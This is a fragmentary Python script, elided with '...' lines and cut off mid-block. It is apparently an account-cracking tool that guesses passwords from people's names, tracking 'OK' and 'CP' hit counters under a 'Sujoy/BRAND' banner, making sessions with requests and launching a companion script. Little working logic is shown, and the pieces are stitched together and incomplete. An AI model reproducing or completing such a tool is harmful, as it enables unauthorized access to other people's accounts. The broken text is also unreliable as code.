import os 
 ...
         os.system('python Sujoy-King.py') 
 ugen = [] 
...
███████  ██████   █████   ██████     ██                                                                      
 ...
         global loop,oks,cps 
         sys.stdout.write('\r\r\033[1;37m[Sujoy/BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush() 
         session = requests.Session() 
         try: 
                 first = names.split(' ')[0] 
                 try: 
